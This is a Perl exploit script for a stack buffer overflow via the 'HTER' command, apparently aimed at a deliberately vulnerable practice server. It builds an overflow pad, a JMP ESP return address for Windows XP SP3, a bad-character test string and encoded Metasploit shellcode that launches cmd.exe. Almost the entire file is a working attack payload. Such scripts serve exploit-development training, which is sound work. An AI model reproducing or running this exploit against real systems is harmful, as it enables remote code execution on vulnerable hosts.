#!/usr/bin/perl
# BoF, pop cmd.exe with text transform BoF.
# perl -e 'print "HTER " . "A" x 2000 . "B" x 41 . "CCCCCCCCDDDDDDDDEEEEEEEE" . "9" x 3940;'
use IO::Socket;

$payload = "HTER ";
$payload.= "A" x 2041;
$ret = "5393427e"; #JMP ESP USER32 XPSP3 without hex encoding
#$shellcode = "cc" x 1978;
#cmd.exe payload generated with msfpayload windows/exec CMD=cmd.exe R | msfencode -t perl | sed -e's/\\x//g'
# turn hex characters into text hex
# check for bad characters
$hellcode =
"cc0102030405060708090a0b0c0d0e0f".
"101112131415161718191a1b1c1d1e1f".
"202122232425262728292a2b2c2d2e2f".
"303132333435363738393a3b3c3d3e3f".
"404142434445464748494a4b4c4d4e4f".
"505152535455565758595a5b5c5d5e5f".
"606162636465666768696a6b6c6d6e6f".
"707172737475767778797a7b7c7d7e7f".
"808182838485868788898a8b8c8d8e8f".
"909192939495969798999a9b9c9d9e9f".
"a0a1a2a3a4a5a6a7a8a9aaabacadaeaf".
"b0b1b2b3b4b5b6b7b8b9babbbcbdbebf".
"c0c1c2c3c4c5c6c7c8c9cacbcccdcecf".
"d0d1d2d3d4d5d6d7d8d9dadbdcdddedf".
"e0e1e2e3e4e5e6e7e8e9eaebecedeeef".
"f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff";
$shellcode=
"ccd9eed97424f45949494949494949" .
"4949494343434343434337515a6a" .
"415850304130416b414151324142" .
"3242423042424142585038414275" .
"4a49796c6d386f79333055505330" .
"51706f79386534715a7270646e6b" .
"336276504c4b7142444c6c4b7362" .
"56746c4b44327468466f6837704a" .
"66464471596f747139504e4c456c" .
"4351534c3552446c45706951584f" .
"666d4331784758625a5053623147" .
"6e6b463252304e6b7262556c3331" .
"58504c4b637042586f7579505254" .
"526a4661485052706e6b31583548" .
"6e6b5368557067714a736d33756c" .
"50496e6b45646e6b533148563561" .
"696f64716f304c6c7a617a6f366d" .
"455158476658597073456b443443" .
"716d7968656b334d675450756a42" .
"73684c4b3058375433314b634536" .
"6c4b566c304b4c4b4368554c4331" .
"69434e6b64446e6b76617a706d59" .
"504436443644436b714b35317369" .
"514a36314b4f4d305148614f514a" .
"6c4b6672686b4c46536d717a5661" .
"4e6d4e6578395550333057706630" .
"735835614e6b706f6b37696f6b65" .
"4f4b7a504f456e42736673586c66" .
"6f654f4d6d4d496f4a75756c3336" .
"316c444a6b30496b797042555445" .
"6f4b315757637342624f424a5770" .
"4363696f68557353506d7244546e" .
"32453078453573304141";
$dst = 3956 - length($shellcode);
$pad = "C" x $dst;

print "$payload$ret$shellcode$pad\n";
